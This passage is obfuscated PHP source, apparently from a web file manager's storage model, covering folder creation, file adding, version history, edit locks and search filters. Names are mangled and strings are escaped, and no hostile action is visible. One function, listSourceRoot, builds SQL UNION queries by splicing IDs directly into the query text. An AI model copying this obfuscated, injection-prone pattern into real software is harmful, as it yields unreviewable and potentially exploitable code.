array_to_keyvalue(array_filter_by_field($í½ğß¿Ÿ, $ŒòĞ³İ[500], $ŒòĞ³İ[91]), $ŒòĞ³İ[12], $ŒòĞ³İ[191]); $ÃéñûÇ¢ = array_merge($ÃéñûÇ¢, array_to_keyvalue($í½ğß¿Ÿ, $ŒòĞ³İ[12], $ŒòĞ³İ[191])); if (!$ˆÉÅÀñ || count($ÃéñûÇ¢) >= $•ğ’†ÂÇ) { break; } } return array_slice($ÃéñûÇ¢, 0, intval($•ğ’†ÂÇ)); } private function _listSearchBindPinyin($«ç™›œÍ, &$„şÀ ¾ú, &$é¹¦±Üê) { $“– ­ù =& $_SERVER[µÅ˜º…æ]; if (!isset($«ç™›œÍ[$“– ­ù[2279]]) || !$«ç™›œÍ[$“– ­ù[2279]]) { return; } if (!Input::check($«ç™›œÍ[$“– ­ù[2279]], $“– ­ù[393]) || strlen($«ç™›œÍ[$“– ­ù[2279]]) < 2) { return; } $Øô¬ëÄï = "\114\105\106\124\x20\112\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\163\157\x75\x72\x63\x65\x5f\x6d\x65\x74\141\x20\x6d\145\x74\141\40\157\x6e\40\163\157\165\x72\143\x65\56\x73\x6f\165\x72\x63\x65\111\x44\40\75\x20\x6d\145\164\141\56\x73\x6f\165\162\143\x65\x49\x44"; $Ü‰—¹¾Ë = array(); $é¹¦±Üê = str_replace(array($“– ­ù[285], $“– ­ù[53], $“– ­ù[2455]), $“– ­ù[12], $é¹¦±Üê); $é¹¦±Üê = $“– ­ù[525] . str_replace($“– ­ù[50], $“– ­ù[526], $é¹¦±Üê); $É±£å•’ = $„şÀ ¾ú[$“– ­ù[32]]; unset($„şÀ ¾ú[$“– ­ù[32]]); foreach ($„şÀ ¾ú as $¿ÀïõŠ“ => $«¿İ£Ïä) { $Ü‰—¹¾Ë[$“– ­ù[525] . $¿ÀïõŠ“] = $«¿İ£Ïä; } foreach ($É±£å•’ as $×‰ı¼à) { $Ü‰—¹¾Ë[] = array($“– ­ù[530] => $×‰ı¼à, $“– ­ù[1169] => $“– ­ù[2283], array($“– ­ù[2456] => $×‰ı¼à, $“– ­ù[2457] => array($“– ­ù[7], array($“– ­ù[552], $“– ­ù[551])))); } $this->join($Øô¬ëÄï); $„şÀ ¾ú = $Ü‰—¹¾Ë; } private function _parseSearchWhere($ëÍ¿³àı) { $ä°ÈşÊı =& $_SERVER[µÅ˜º…æ]; $Ëğ¯Õ©Ë = array(); if (isset($ëÍ¿³àı[$ä°ÈşÊı[860]]) && $ëÍ¿³àı[$ä°ÈşÊı[860]]) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[88]] = array($ä°ÈşÊı[2458], $ëÍ¿³àı[$ä°ÈşÊı[860]]); } if (isset($ëÍ¿³àı[$ä°ÈşÊı[861]]) && $ëÍ¿³àı[$ä°ÈşÊı[861]]) { $Ğ¦æ´ÎŠ = array($ä°ÈşÊı[2459], $ëÍ¿³àı[$ä°ÈşÊı[861]]); if ($Ëğ¯Õ©Ë[$ä°ÈşÊı[88]]) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[88]] = array($Ëğ¯Õ©Ë[$ä°ÈşÊı[88]], $Ğ¦æ´ÎŠ, $ä°ÈşÊı[2460]); } else { $Ëğ¯Õ©Ë[$ä°ÈşÊı[88]] = $Ğ¦æ´ÎŠ; } } if (isset($ëÍ¿³àı[$ä°ÈşÊı[2452]]) && $ëÍ¿³àı[$ä°ÈşÊı[2452]] > 0) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[79]] = array($ä°ÈşÊı[2458], $ëÍ¿³àı[$ä°ÈşÊı[2452]]); } if (isset($ëÍ¿³àı[$ä°ÈşÊı[2453]]) && $ëÍ¿³àı[$ä°ÈşÊı[2453]]) { $Ğ¦æ´ÎŠ = array($ä°ÈşÊı[2459], $ëÍ¿³àı[$ä°ÈşÊı[2453]]); if ($Ëğ¯Õ©Ë[$ä°ÈşÊı[79]]) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[79]] = array($Ëğ¯Õ©Ë[$ä°ÈşÊı[79]], $Ğ¦æ´ÎŠ, $ä°ÈşÊı[2460]); } else { $Ëğ¯Õ©Ë[$ä°ÈşÊı[79]] = $Ğ¦æ´ÎŠ; } } if (isset($ëÍ¿³àı[$ä°ÈşÊı[684]]) && $ëÍ¿³àı[$ä°ÈşÊı[684]]) { $Ëğ¯Õ©Ë[] = array($ä°ÈşÊı[543] => $ëÍ¿³àı[$ä°ÈşÊı[684]], $ä°ÈşÊı[541] => $ëÍ¿³àı[$ä°ÈşÊı[684]], $ä°ÈşÊı[1169] => $ä°ÈşÊı[2283]); } if (isset($ëÍ¿³àı[$ä°ÈşÊı[501]]) && $ëÍ¿³àı[$ä°ÈşÊı[501]]) { $À­Ôè¾ = $ëÍ¿³àı[$ä°ÈşÊı[501]]; if ($À­Ôè¾ == $ä°ÈşÊı[78]) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[500]] = 1; } else { if ($À­Ôè¾ == $ä°ÈşÊı[2461]) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[500]] = 0; } else { if ($À­Ôè¾) { $À­Ôè¾ = is_array($À­Ôè¾) ? $À­Ôè¾ : explode($ä°ÈşÊı[50], $À­Ôè¾); $Ëğ¯Õ©Ë[$ä°ÈşÊı[501]] = array($ä°ÈşÊı[507], $À­Ôè¾); $Ëğ¯Õ©Ë[$ä°ÈşÊı[500]] = 0; } } } } $this->_parseSearchParent($ëÍ¿³àı, $Ëğ¯Õ©Ë); if (isset($ëÍ¿³àı[$ä°ÈşÊı[2279]]) && trim($ëÍ¿³àı[$ä°ÈşÊı[2279]])) { $•Ç•ÌøÉ = trim($ëÍ¿³àı[$ä°ÈşÊı[2279]]); $âŸŠ‹å = explode($ä°ÈşÊı[53], $•Ç•ÌøÉ); if (strlen($•Ç•ÌøÉ) > 2 && (substr($•Ç•ÌøÉ, 0, 1) == $ä°ÈşÊı[118] && substr($•Ç•ÌøÉ, -1) == $ä°ÈşÊı[118]) || substr($•Ç•ÌøÉ, 0, 1) == $ä°ÈşÊı[58] && substr($•Ç•ÌøÉ, -1) == $ä°ÈşÊı[58]) { $•Ç•ÌøÉ = substr($•Ç•ÌøÉ, 1, -1); $âŸŠ‹å = array($•Ç•ÌøÉ); } $Ëğ¯Õ©Ë[$ä°ÈşÊı[32]] = array(array($ä°ÈşÊı[635], $ä°ÈşÊı[2281] . $•Ç•ÌøÉ . $ä°ÈşÊı[2281])); if (count($âŸŠ‹å) > 1) { $Ëğ¯Õ©Ë[$ä°ÈşÊı[32]] = array(); foreach ($âŸŠ‹å as $­§‡–Ä‚) { if (!trim($­§‡–Ä‚)) { continue; } $Ëğ¯Õ©Ë[$ä°ÈşÊı[32]][] = array($ä°ÈşÊı[635], $ä°ÈşÊı[2281] . trim($­§‡–Ä‚) . $ä°ÈşÊı[2281]); } } } return $Ëğ¯Õ©Ë; } private function _parseSearchParent($Æ¸¹›‚, &$’›èƒ´) { $¥ÅÁÕäË =& $_SERVER[µÅ˜º…æ]; if (!isset($Æ¸¹›‚[$¥ÅÁÕäË[190]]) || !$Æ¸¹›‚[$¥ÅÁÕäË[190]]) { return; } $¨ÙïÃ‡® = $this->pathInfo($Æ¸¹›‚[$¥ÅÁÕäË[190]]); $‘ÒÀåí = $¨ÙïÃ‡®[$¥ÅÁÕäË[190]] . $¥ÅÁÕäË[12] === $¥ÅÁÕäË[228]; $å•ĞîåÃ = $¨ÙïÃ‡®[$¥ÅÁÕäË[188]] == $¥ÅÁÕäË[598]; if ($¨ÙïÃ‡®[$¥ÅÁÕäË[614]] == $¥ÅÁÕäË[615]) { $Ûè³œŠ€ = $this->sourceInfo($Æ¸¹›‚[$¥ÅÁÕäË[190]]); $¨ÙïÃ‡®[$¥ÅÁÕäË[604]] = $Ûè³œŠ€[$¥ÅÁÕäË[604]]; } $’›èƒ´[$¥ÅÁÕäË[674]] = array($¥ÅÁÕäË[635], $¨ÙïÃ‡®[$¥ÅÁÕäË[604]] . $Æ¸¹›‚[$¥ÅÁÕäË[190]] . $¥ÅÁÕäË[636]); $É‡Õîù¥ = isset($Æ¸¹›‚[$¥ÅÁÕäË[2142]]) && in_array($¥ÅÁÕäË[598], $Æ¸¹›‚[$¥ÅÁÕäË[2142]]); if (!$É‡Õîù¥ || !$å•ĞîåÃ || !$‘ÒÀåí || !$¨ÙïÃ‡®[$¥ÅÁÕäË[502]]) { return; } if (!AuthModel::authCheckRoot($¨ÙïÃ‡®[$¥ÅÁÕäË[502]][$¥ÅÁÕäË[503]])) { return; } $ÀõÌá« = $¨ÙïÃ‡®[$¥ÅÁÕäË[589]] . $¥ÅÁÕäË[12]; if ($ÀõÌá« == $¥ÅÁÕäË[91]) { unset($’›èƒ´[$¥ÅÁÕäË[674]]); $’›èƒ´[$¥ÅÁÕäË[188]] = self::TYPE_GROUP; return; } $Ñ‡ÎëİÃ = Model($¥ÅÁÕäË[605])->groupChildrenAll($ÀõÌá«); $îÑ†¥´å = count($Ñ‡ÎëİÃ); if ($îÑ†¥´å <= 1) { return; } $ÒõÆÂÄÒ = array($¥ÅÁÕäË[190] => 0, $¥ÅÁÕäË[188] => self::TYPE_GROUP, $¥ÅÁÕäË[589] => array($¥ÅÁÕäË[7], $Ñ‡ÎëİÃ)); $©¹‰—ú¾ = $this->field($¥ÅÁÕäË[2462])->where($ÒõÆÂÄÒ)->limit($îÑ†¥´å)->select(); $’›èƒ´[$¥ÅÁÕäË[674]] = array(); foreach ($©¹‰—ú¾ as $Ø®ÆÔÛ¹) { $’›èƒ´[$¥ÅÁÕäË[674]][] = array($¥ÅÁÕäË[635], $¥ÅÁÕäË[613] . $Ø®ÆÔÛ¹[$¥ÅÁÕäË[191]] . $¥ÅÁÕäË[636]); } $’›èƒ´[$¥ÅÁÕäË[674]][] = $¥ÅÁÕäË[2283]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($‹øÏ±Â‹) { $É€“ÑñŠ =& $_SERVER[µÅ˜º…æ]; $ïîÄ´Ùı = Model($É€“ÑñŠ[597])->where(array($É€“ÑñŠ[1967] => $‹øÏ±Â‹))->find(); $¨­Ú“£ğ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‹øÏ±Â‹, $ïîÄ´Ùı[$É€“ÑñŠ[32]]); $this->userDesktopAdd($¨­Ú“£ğ); return $¨­Ú“£ğ; } public function userDesktopAdd($Ïâ‹­ùÊ) { $‹œŒÃÅÙ =& $_SERVER[µÅ˜º…æ]; $¥ªÅ‹İÎ = LNG($‹œŒÃÅÙ[2463]); $š®«õÏØ = $this->mkdir($Ïâ‹­ùÊ, $¥ªÅ‹İÎ); $this->metaSet($š®«õÏØ, $‹œŒÃÅÙ[2464], $‹œŒÃÅÙ[91]); $this->metaSet($Ïâ‹­ùÊ, $‹œŒÃÅÙ[2465], $š®«õÏØ); } public function userPathSafeAdd($»äíˆ´) { $ —ıûË =& $_SERVER[µÅ˜º…æ]; $·ôÂ½æà = Model($ —ıûË[597])->getInfoFull($»äíˆ´); if (!$·ôÂ½æà) { return !1; } if (_get($·ôÂ½æà, $ —ıûË[618])) { return $·ôÂ½æà[$ —ıûË[555]][$ —ıûË[2466]]; } $Ô‰üæ = $this->_mkdirRoot(SourceModel::TYPE_USER, $»äíˆ´, $ —ıûË[2467], $ —ıûË[2468]); Model($ —ıûË[597])->metaSet($»äíˆ´, $ —ıûË[2466], $Ô‰üæ); $this->metaSet($Ô‰üæ, $ —ıûË[2469], $»äíˆ´); return $Ô‰üæ; } public function userPathAppAdd($€ú€øóÔ, $Ù……çö´ = '', $¹€È«”Ğ = '') { $®­¢ÆÀÃ =& $_SERVER[µÅ˜º…æ]; $åÜğÈ¤Á = Model($®­¢ÆÀÃ[597])->getInfoFull($€ú€øóÔ); if (!$åÜğÈ¤Á) { return !1; } $Ğæš×àô = $åÜğÈ¤Á[$®­¢ÆÀÃ[555]] ? $åÜğÈ¤Á[$®­¢ÆÀÃ[555]] : array(); $É¢åå©¶ = $Ğæš×àô[$®­¢ÆÀÃ[2470]]; if (!$É¢åå©¶) { $É¢åå©¶ = $this->_mkdirRoot(SourceModel::TYPE_USER, $€ú€øóÔ, $®­¢ÆÀÃ[2471], $®­¢ÆÀÃ[2472]); Model($®­¢ÆÀÃ[597])->metaSet($€ú€øóÔ, $®­¢ÆÀÃ[2470], $É¢åå©¶ . $®­¢ÆÀÃ[12]); $this->metaSet($É¢åå©¶, $®­¢ÆÀÃ[2470], $€ú€øóÔ); } if (!$Ù……çö´) { return $É¢åå©¶; } $°š’²ÕË = $Ğæš×àô[$®­¢ÆÀÃ[2473] . $Ù……çö´]; if (!$°š’²ÕË) { $°š’²ÕË = $this->mkdir($É¢åå©¶, $Ù……çö´); Model($®­¢ÆÀÃ[597])->metaSet($€ú€øóÔ, $®­¢ÆÀÃ[2473] . $Ù……çö´, $°š’²ÕË); $this->metaSet($°š’²ÕË, $®­¢ÆÀÃ[2473] . $Ù……çö´, $€ú€øóÔ); } if (!$¹€È«”Ğ) { return $°š’²ÕË; } $“ä¦¢Š¸ = $this->mkdir($°š’²ÕË, $¹€È«”Ğ); return $“ä¦¢Š¸; } public function groupRootAdd($´÷İ±®´) { $Îå‘Ê =& $_SERVER[µÅ˜º…æ]; $ŒÙ‹£ = Model($Îå‘Ê[605])->where(array($Îå‘Ê[2268] => $´÷İ±®´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $´÷İ±®´, $ŒÙ‹£[$Îå‘Ê[32]]); } public function systemRootPathAdd($¡›Ş·ì³) { if ($¡›Ş·ì³ != $_SERVER[µÅ˜º…æ][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¡›Ş·ì³); } public function userRootRemove($Âíò¢ò¿) { $öÄÜå±† = $this->targetSourceRoot(SourceModel::TYPE_USER, $Âíò¢ò¿, !0); foreach ($öÄÜå±† as $Ö øÁ®›) { if (!$Ö øÁ®›) { continue; } $this->remove($Ö øÁ®›[$_SERVER[µÅ˜º…æ][191]], !1); } } public function groupRootRemove($›šû¤Úç) { $ª®ÄõÔµ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $›šû¤Úç); if (!$ª®ÄõÔµ) { return; } $this->remove($ª®ÄõÔµ[$_SERVER[µÅ˜º…æ][191]], !1); } private function _mkdirRoot($®ë¢ˆœÇ, $æì¬í­ø, $§Ê£Î, $ä–è„Ğ = '') { $ç¡†öÕµ =& $_SERVER[µÅ˜º…æ]; $’š¿É = KodUser::id(); $ì·³Àà = array($ç¡†öÕµ[492] => 0, $ç¡†öÕµ[670] => $®ë¢ˆœÇ, $ç¡†öÕµ[671] => $æì¬í­ø, $ç¡†öÕµ[668] => 1, $ç¡†öÕµ[672] => $’š¿É, $ç¡†öÕµ[673] => $’š¿É, $ç¡†öÕµ[669] => $ä–è„Ğ, $ç¡†öÕµ[674] => $ç¡†öÕµ[613], $ç¡†öÕµ[519] => 0, $ç¡†öÕµ[640] => 0, $ç¡†öÕµ[558] => 0, $ç¡†öÕµ[675] => $ç¡†öÕµ[12]); if ($Ş ä€€£ = $this->where($ì·³Àà)->find()) { return $Ş ä€€£[$ç¡†öÕµ[191]]; } $Ø‰ó£Œ„ = "\x4d\157\x64\145\x6c\123\x6f\x75\162\143\x65\x2e\155\153\144\x69\162\x52\157\157\x74\x2e{$®ë¢ˆœÇ}\56{$æì¬í­ø}\56" . $§Ê£Î; CacheLock::lock($Ø‰ó£Œ„); $ì·³Àà[$ç¡†öÕµ[32]] = $§Ê£Î; $¼µ—Œæ– = $this->add($ì·³Àà); $ğƒúÖ¬á = array($ç¡†öÕµ[676] => short_id($¼µ—Œæ–)); $this->where(array($ç¡†öÕµ[506] => $¼µ—Œæ–))->save($ğƒúÖ¬á); CacheLock::unlock($Ø‰ó£Œ„); return $¼µ—Œæ–; } private function targetSourceRoot($‘Ü©÷Ê£, $äŸ®ñı¬, $‰‹š¡¯× = false) { $ğÏÌäñƒ =& $_SERVER[µÅ˜º…æ]; $¯± ±Ç = array($ğÏÌäñƒ[492] => 0, $ğÏÌäñƒ[670] => $‘Ü©÷Ê£, $ğÏÌäñƒ[671] => $äŸ®ñı¬); if ($‰‹š¡¯×) { $úë¦Êœ = $this->where($¯± ±Ç)->select(); return $úë¦Êœ ? $úë¦Êœ : array(); } $üÁéğ³ = $this->where($¯± ±Ç)->find(); return $üÁéğ³ ? $üÁéğ³ : array(); } public function sourceRootGroup($²Óô÷¾„) { $íÙØ™˜ã =& $_SERVER[µÅ˜º…æ]; if (is_string($²Óô÷¾„)) { $²Óô÷¾„ = array($²Óô÷¾„); } $ü˜…ÏŸ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $²Óô÷¾„, $íÙØ™˜ã[220]); $Øãû™± = array($íÙØ™˜ã[446] => $ü˜…ÏŸ, $íÙØ™˜ã[443] => array($íÙØ™˜ã[858] => count($²Óô÷¾„))); $this->_listDataApply($Øãû™±[$íÙØ™˜ã[446]]); $this->_listMake($Øãû™±); return array_to_keyvalue($Øãû™±[$íÙØ™˜ã[85]], $íÙØ™˜ã[589]); } public function mkfile($çŠÜÕó˜, $ğï ŞÂÜ, $î˜£²™î = '', $Ò÷µÁõ = REPEAT_RENAME) { $ÂàÇî”İ =& $_SERVER[µÅ˜º…æ]; $³’¼½ëÒ = KodIO::ioFileDriverGet($ÂàÇî”İ[498] . $çŠÜÕó˜ . $ÂàÇî”İ[402]); $« çç­ƒ = Model($ÂàÇî”İ[696])->addFileByContent($î˜£²™î, $³’¼½ëÒ, $ğï ŞÂÜ); return $this->_createFileCall($çŠÜÕó˜, $ğï ŞÂÜ, $« çç­ƒ, $Ò÷µÁõ, $ÂàÇî”İ[1543]); } public function addFile($ïõ˜÷ç, $×ì·­É½, $Œµ®õ™Š, $áş÷· = false, $·ĞÜ¶Œ— = REPEAT_RENAME) { $Ì³‹ßö÷ =& $_SERVER[µÅ˜º…æ]; $õ±í®¥ƒ = KodIO::ioFileDriverGet($Ì³‹ßö÷[498] . $ïõ˜÷ç . $Ì³‹ßö÷[402]); $…ˆÅÇ¯’ = Model($Ì³‹ßö÷[696])->addFile($×ì·­É½, $õ±í®¥ƒ, $Œµ®õ™Š, $áş÷·); return $this->_createFileCall($ïõ˜÷ç, $Œµ®õ™Š, $…ˆÅÇ¯’, $·ĞÜ¶Œ—); } public function addFileByFileID($™±ã”‹, $ç¤‹ß¥, $×ÏëÏâ, $õª»„¾Ò = REPEAT_RENAME) { $°ĞÅ…à =& $_SERVER[µÅ˜º…æ]; $Àã’õ”Î = Model($°ĞÅ…à[696])->find($ç¤‹ß¥); Model($°ĞÅ…à[696])->linkAdd($ç¤‹ß¥); return $this->_createFileCall($™±ã”‹, $×ÏëÏâ, $Àã’õ”Î, $õª»„¾Ò); } public function addFileByRemote($ÃÎ¾ûµÉ, $ÇŠ‚², $Ç…ü‡îì, $÷âÓÇÉÇ = array(), $¼·”òø‚ = REPEAT_RENAME) { $õİ”µ…÷ = Model($_SERVER[µÅ˜º…æ][696])->addFileByRemote($ÇŠ‚², $Ç…ü‡îì, $÷âÓÇÉÇ); return $this->_createFileCall($ÃÎ¾ûµÉ, $Ç…ü‡îì, $õİ”µ…÷, $¼·”òø‚); } private function _createFileCall($»Éç…Ï, $²äÁà‡¥, $ÛğëÛô, $”Éîåˆï, $©Ó²¦… = "\165\160\154\x6f\141\x64") { $éÔ²íü¯ =& $_SERVER[µÅ˜º…æ]; if (!$ÛğëÛô) { return !1; } $œ¿å³§ = !1; $this->setMasterDB(); $this->lockWriteStart($»Éç…Ï, $²äÁà‡¥); $üÛıØ = $this->fileNameExist($»Éç…Ï, $²äÁà‡¥); $¹Ïüè = $this->_createFile($»Éç…Ï, $²äÁà‡¥, $ÛğëÛô, $”Éîåˆï, $œ¿å³§); if (!$œ¿å³§) { Model($éÔ²íü¯[560])->remove($ÛğëÛô[$éÔ²íü¯[557]]); } if ($œ¿å³§ && $¹Ïüè && $¹Ïüè != $üÛıØ) { Model($éÔ²íü¯[2436])->eventCreate($¹Ïüè, $©Ó²¦…); } $this->lockWriteEnd($»Éç…Ï, $²äÁà‡¥); return $¹Ïüè; } public function mkdir($öß¥Í³ê, $¶ïïİ, $Ù¯íÃİ = REPEAT_SKIP) { $ûû‹±˜Ğ =& $_SERVER[µÅ˜º…æ]; $this->setMasterDB(); $ğ›“Ö› = $this->sourceInfo($öß¥Í³ê); if (!$ğ›“Ö›) { return !1; } $this->lockWriteStart($öß¥Í³ê, $¶ïïİ); if ($Ù¯íÃİ !== !1) { $¬œ×á·Ñ = $this->fileNameExist($öß¥Í³ê, $¶ïïİ); if ($¬œ×á·Ñ && $Ù¯íÃİ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($öß¥Í³ê, $¶ïïİ); return $¬œ×á·Ñ; } $¶ïïİ = $this->fileNameAuto($öß¥Í³ê, $¶ïïİ, $Ù¯íÃİ); } $Ã–ñ§ÚÃ = array($ûû‹±˜Ğ[668] => 1, $ûû‹±˜Ğ[509] => $¶ïïİ, $ûû‹±˜Ğ[669] => $ûû‹±˜Ğ[12], $ûû‹±˜Ğ[558] => 0, $ûû‹±˜Ğ[640] => 0); $Ùé§»‰˜ = $this->_addSource($Ã–ñ§ÚÃ, $ğ›“Ö›); Model($ûû‹±˜Ğ[2436])->eventCreate($Ùé§»‰˜, $ûû‹±˜Ğ[1544]); $this->lockWriteEnd($öß¥Í³ê, $¶ïïİ); return $Ùé§»‰˜; } public function listSourceRoot($ã•Ã½‰¿, $š¨—óÓà, $ëÌ¿²Ûş = "\163\157\x75\x72\143\145\x49\x44\x2c\x74\x61\162\147\x65\164\111\104\x2c\x73\151\x7a\x65") { $´¸„à¹ê =& $_SERVER[µÅ˜º…æ]; $¾«‡´µË = $´¸„à¹ê[463]; $ ™»õ¤‡ = array(); $éâ¢œâ– = 1024 * 50; $¿‚Î¥ÑÒ = is_array($¿‚Î¥ÑÒ) ? $¿‚Î¥ÑÒ : array(); $ÙÑË¹ê = count($š¨—óÓà); $Ù ùİÏé = $this->tablePrefix . $´¸„à¹ê[470]; for ($Ï‘şêÅÈ = 0; $Ï‘şêÅÈ < $ÙÑË¹ê; $Ï‘şêÅÈ++) { $£¾Ş¢Å = $š¨—óÓà[$Ï‘şêÅÈ]; $¾«‡´µË .= "\123\x45\114\105\103\124\40\x2a\40\x46\x52\117\115\40\x28\123\x45\x4c\105\103\124\40{$ëÌ¿²Ûş}\40\x46\x52\117\x4d\40\140{$Ù ùİÏé}\x60\40\x57\x48\x45\x52\105\x20"; $¾«‡´µË .= "\x60\x70\141\x72\x65\156\164\x49\104\x60\x3d\60\40\101\x4e\x44\40\140\x74\141\x72\x67\145\164\111\x44\x60\75{$£¾Ş¢Å}\40\101\x4e\104\40\140\x74\x61\162\x67\x65\x74\x54\x79\x70\x65\x60\75{$ã•Ã½‰¿}\40\141\156\x64\x20\x66\x69\x6c\x65\x54\171\160\x65\x3d\x27\47\x20\154\151\x6d\151\164\40\x31\51\x20\x61\x73\40\x74\142\137{$Ï‘şêÅÈ}\x20\125\x4e\111\117\x4e\x20\101\114\x4c\x20"; if ((strlen($¾«‡´µË) >= $éâ¢œâ– || $Ï‘şêÅÈ == $ÙÑË¹ê - 1) && $¾«‡´µË) { $¾«‡´µË = substr($¾«‡´µË, 0, -strlen($´¸„à¹ê[1207])); $Ô÷–ËŒ‚ = $this->query($¾«‡´µË); $¾«‡´µË = $´¸„à¹ê[12]; $ ™»õ¤‡ = array_merge($ ™»õ¤‡, $Ô÷–ËŒ‚); } } return $ ™»õ¤‡; } private function _createFile($úšœêğß, $¼µœÒèµ, $õ§ÚˆŒß, $ôš¾ñ·°, &$ü á¹·‹) { $ËĞßù¢’ =& $_SERVER[µÅ˜º…æ]; $êö½æé¹ = $this->sourceInfo($úšœêğß); if (!$õ§ÚˆŒß || !$êö½æé¹) { return !1; } if ($ôš¾ñ·° !== !1) { $Ğ¼óú™ = $this->fileNameExist($úšœêğß, $¼µœÒèµ); } $ü á¹·‹ = !0; if ($ôš¾ñ·° && $Ğ¼óú™) { if ($ôš¾ñ·° == REPEAT_SKIP) { $ü á¹·‹ = !1; return $Ğ¼óú™; } else { if ($ôš¾ñ·° == REPEAT_REPLACE) { $ø­Ô­İ = $this->sourceInfo($Ğ¼óú™); $ÍëÉ›µ® = $this->fileHistory($ø­Ô­İ, $õ§ÚˆŒß[$ËĞßù¢’[557]], $õ§ÚˆŒß[$ËĞßù¢’[79]]); if (!$ÍëÉ›µ®) { $ü á¹·‹ = !1; } else { $this->folderSizeReset($úšœêğß); } return $Ğ¼óú™; } else { $¼µœÒèµ = $this->fileNameAuto($úšœêğß, $¼µœÒèµ, $ôš¾ñ·°, !1); } } } $ı¤ä¦¾ù = array($ËĞßù¢’[668] => 0, $ËĞßù¢’[509] => $¼µœÒèµ, $ËĞßù¢’[669] => substr(get_path_ext($¼µœÒèµ), 0, 10), $ËĞßù¢’[558] => $õ§ÚˆŒß[$ËĞßù¢’[557]], $ËĞßù¢’[640] => $õ§ÚˆŒß[$ËĞßù¢’[79]]); $ÙŸ³ÀÁ = $this->_addSource($ı¤ä¦¾ù, $êö½æé¹); $this->folderSizeReset($úšœêğß, intval($ı¤ä¦¾ù[$ËĞßù¢’[79]])); return $ÙŸ³ÀÁ; } protected function fileHistory($ÌË¾ş¼›, $Á‘Ìø¨¯, $Ë¤“ôÅ¦) { $ÛÈ‰ÍÆ¾ =& $_SERVER[µÅ˜º…æ]; if ($ÌË¾ş¼›[$ÛÈ‰ÍÆ¾[557]] == $Á‘Ìø¨¯) { return !1; } $this->checkLock($ÌË¾ş¼›[$ÛÈ‰ÍÆ¾[191]], $Á‘Ìø¨¯); Model($ÛÈ‰ÍÆ¾[2181])->addHistory($ÌË¾ş¼›); $¸µ‘İè = array($ÛÈ‰ÍÆ¾[673] => USER_ID, $ÛÈ‰ÍÆ¾[513] => time(), $ÛÈ‰ÍÆ¾[557] => $Á‘Ìø¨¯, $ÛÈ‰ÍÆ¾[79] => $Ë¤“ôÅ¦); $this->where(array($ÛÈ‰ÍÆ¾[506] => $ÌË¾ş¼›[$ÛÈ‰ÍÆ¾[191]]))->save($¸µ‘İè); $this->sourceCacheClear($ÌË¾ş¼›[$ÛÈ‰ÍÆ¾[191]]); return !0; } public function checkLock($ÃòÃöŠ°, $ÅîîÄ·Æ) { $‚‡®õò› =& $_SERVER[µÅ˜º…æ]; $Åˆ»¢İ = $this->pathInfo($ÃòÃöŠ°); if (!$this->fileIsLock($Åˆ»¢İ, !0)) { return; } $Ÿš¿„ò“ = Session::get($‚‡®õò›[2474]); $ ëÚúĞ = substr($Åˆ»¢İ[$‚‡®õò›[32]], 0, -1 - strlen($Åˆ»¢İ[$‚‡®õò›[166]])) . $‚‡®õò›[1399] . $Ÿš¿„ò“ . $‚‡®õò›[10] . $Åˆ»¢İ[$‚‡®õò›[166]]; $ö‹Ç» ¨ = Model($‚‡®õò›[696])->find($ÅîîÄ·Æ); $this->_createFileCall($Åˆ»¢İ[$‚‡®õò›[190]], $ ëÚúĞ, $ö‹Ç» ¨, REPEAT_REPLACE, $‚‡®õò›[1543]); $¾ä†µş = $Åˆ»¢İ[$‚‡®õò›[555]][$‚‡®õò›[633]]; $ë€ä‡²¿ = $¾ä†µş[$‚‡®õò›[2475]] ? $¾ä†µş[$‚‡®õò›[2475]] : $¾ä†µş[$‚‡®õò›[32]]; show_json(LNG($‚‡®õò›[2476]) . $‚‡®õò›[2477] . LNG($‚‡®õò›[2478]) . $‚‡®õò›[2479] . $ë€ä‡²¿ . $‚‡®õò›[2480], !1); } public function fileIsLock($¶˜ñºƒ¬, $¿ä±ÔÉ¹ = false) { $ÏïëËüà =& $_SERVER[µÅ˜º…æ]; if (!_get($¶˜ñºƒ¬, $ÏïëËüà[629], 0)) { return !1; } if ($¶˜ñºƒ¬[$ÏïëËüà[555]][$ÏïëËüà[632]] != USER_ID) { return !0; } $ˆÏËÔ­ = $GLOBALS[$ÏïëËüà[6]][$ÏïëËüà[92]][$ÏïëËüà[630]]; if ($¶˜ñºƒ¬[$ÏïëËüà[555]][$ÏïëËüà[631]] <= time() - $ˆÏËÔ­) { $this->metaSet($¶˜ñºƒ¬[$ÏïëËüà[191]], $ÏïëËüà[632], null); $this->metaSet($¶˜ñºƒ¬[$ÏïëËüà[191]], $ÏïëËüà[631], null); } if ($¿ä±ÔÉ¹) { $this->metaSet($¶˜ñºƒ¬[$ÏïëËüà[191]], $ÏïëËüà[631], time()); } return !1; } private function _addSource($Â¨¹ÏÒ†, $åéòİÓÈ) { $¸£Æ…¬å =& $_SERVER[µÅ˜º…æ]; $Ó¼è–ì = KodUser::id(); $§ŸÔ¸ûí = array($¸£Æ…¬å[670] => $åéòİÓÈ[$¸£Æ…¬å[188]], $¸£Æ…¬å[671] => $åéòİÓÈ[$¸£Æ…¬å[589]], $¸£Æ…¬å[672] => $Ó¼è–ì, $¸£Æ…¬å[673] => $Ó¼è–ì, $¸£Æ…¬å[492] => $åéòİÓÈ[$¸£Æ…¬å[191]], $¸£Æ…¬å[674] => $åéòİÓÈ[$¸£Æ…¬å[604]] . $åéòİÓÈ[$¸£Æ…¬å[191]] . $¸£Æ…¬å[50], $¸£Æ…¬å[519] => 0, $¸£Æ…¬å[675] => $¸£Æ…¬å[12]); $Â¨¹ÏÒ† = array_merge($§ŸÔ¸ûí, $Â¨¹ÏÒ†); $this->updateModifyTime($Â¨¹ÏÒ†[$¸£Æ…¬å[190]]); $Ç×äÊĞÑ = $¸£Æ…¬å[2481] . $åéòİÓÈ[$¸£Æ…¬å[191]]; if 